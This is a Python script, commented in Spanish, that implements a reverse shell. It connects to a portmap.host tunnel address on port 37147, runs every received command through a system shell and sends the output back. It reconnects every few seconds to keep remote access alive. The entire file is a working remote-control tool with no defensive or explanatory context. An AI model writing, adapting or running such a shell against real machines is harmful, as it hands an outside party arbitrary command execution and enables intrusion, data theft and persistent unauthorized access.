#!/usr/bin/env python3
"""
REVERSE SHELL CORREGIDO - PORTMAP.IO
"""

import socket
import subprocess
import os
import sys
import time
import signal

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"
PORT = 37147
RECONNECT_DELAY = 3
# =========================

def simple_reverse_shell():
    """Versión simple y robusta sin errores"""
    print(f"[+] Conectando a {HOST}:{PORT}")
    
    while True:
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect((HOST, PORT))
            s.settimeout(None)
            
            print("[+] Conectado - Shell lista")
            
            # Enviar prompt inicial
            s.sendall(b"\n[+] Shell conectada - Escribe comandos:\n$ ")
            
            while True:
                try:
                    # Recibir comando
                    data = s.recv(1024).decode().strip()
                    
                    if not data:
                        break
                    
                    if data.lower() in ["exit", "quit"]:
                        s.sendall(b"\n[!] Cerrando...\n")
                        break
                    
                    # Ejecutar comando
                    try:
                        proc = subprocess.Popen(
                            data,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE
                        )
                        
                        output, error = proc.communicate(timeout=30)
                        
                        if output:
                            s.sendall(output)
                        if error:
                            s.sendall(b"\n[ERROR]: " + error)
                        
                        s.sendall(b"\n$ ")
                        
                    except subprocess.TimeoutExpired:
                        s.sendall(b"\n[TIMEOUT] Comando tardando mucho\n$ ")
                        proc.kill()
                    except Exception as e:
                        s.sendall(f"\n[ERROR]: {str(e)[:50]}\n$ ".encode())
                    
                except socket.timeout:
                    # Mantener conexión viva - ERROR CORREGIDO AQUÍ
                    s.sendall(b"\n[PING] Conexion activa\n$ ")
                    continue
                except:
                    break
            
            s.close()
            time.sleep(RECONNECT_DELAY)
            
        except KeyboardInterrupt:
            print("\n[+] Interrumpido")
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error: {e} - Reconectando...")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    print(f"""
{'='*60}
🔥 REVERSE SHELL - PORTMAP.IO
{'='*60}
🌍 URL: {HOST}:{PORT}
👤 Usuario: {os.getenv('USER', 'unknown')}
⏰ Hora: {time.strftime('%H:%M:%S')}
{'='*60}
    """)
    
    simple_reverse_shell()
